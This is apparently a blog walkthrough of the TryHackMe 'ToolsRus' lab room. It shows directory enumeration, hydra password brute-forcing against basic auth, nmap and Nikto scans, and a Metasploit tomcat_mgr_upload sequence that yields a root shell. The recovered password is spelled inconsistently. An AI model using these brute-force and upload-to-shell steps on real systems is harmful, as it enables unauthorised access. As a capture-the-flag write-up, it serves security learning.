---
title: Write-Up [THM] ToolsRus
template: "post"
date: "2020-08-28"
draft: false
category: "Write-Ups, TryHackMe"
tags:
  - "TryHackMe"
  - "Web"
  - "dirbuster"
  - "nikto"
  - "metasploit"
  - "hydra"
social-image: "/media/thm/toolsRus/theme.png"
description: "It's a write-up about the room : [Try Hack Me - Room : ToolsRus](https://tryhackme.com/room/toolsRus)"
---

It's a write-up about the room : [Try Hack Me - Room : ToolsRus](https://tryhackme.com/room/toolsRus)

# [Task 1] ToysRus

![Task 1](/assets/img/thm/toolsRus/task-1.png)


First, we deploy the machine.

* What directory can you find, that begins with a "g"?

We use `Dirbuster` with : 

```
Target Url : http://ip_machine:80/
File with lists of dirs/files : directory-list-2.3-medium.txt
Dir to start with : /
File extension : php
```

The directory that begins with a "g" is **guidelines**.

* Whose name can you find from this directory?

Go to : `http://ip_machine/guidelines` and find the message : 

```
Hey bob, did you update that TomCat server? 
```   

Therefore the name is **bob**.

* What directory has basic authentication?

With dirbuster, we find the directory **protected** which needs basic authentication.

* What is bob's password to the protected part of the website?

We use `hydra` in a terminal : `hydra -l bob -P rockyou.txt -f ip_machine http-get /protected/`  
We find **bubbles** as password.

* What other port that serves a webs service is open on the machine?

We use nmap to see all the ports : ` nmap -sV ip_machine`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The other port that serves a webs service which is open is the port **1234**.

* Going to the service running on that port, what is the name and version of the software?

Go on `http://ip_machine:1234/`.  
On that page we find the name and the version of the software : **Apache Tomcat/7.0.88**.

* Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?

Go on `http://ip_machine:1234/manager/html` with the credentials :

```
login : bob
password : bubble
```

We could also use : `nikto -h http://ip_machine:1234/manager/html -id bob:bublles`.
We find **5** documentation files.


* What is the server version (run the scan against port 80)?

With nmap, we find the server version **Apache/2.4.18** for the port 80.

* What version of Apache-Coyote is this service using? 

With nmap also, we find the service version of Apache-Coyote which is **1.1**.

* Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?

To launch metasploit on the console : `msfconsole`.  
After we use this different command : 

```
search tomcat  
use multi/http/tomcat_mgr_upload
show options
set httpPassword bubbles
set httpUsername bob
set RHOSTS ip_machine
SET RPORT 1234
run
```

Then , we can use the shell by typing `shell`.
To see what user we are, we use `whoami`.   
The output is **root**. 

* What text is in the file /root/flag.txt ?

We use cat to see the flag : `cat /root/flag.txt`.  
The flag is **ff1fc4a81affcc7688cf89ae7dc6e0e1**.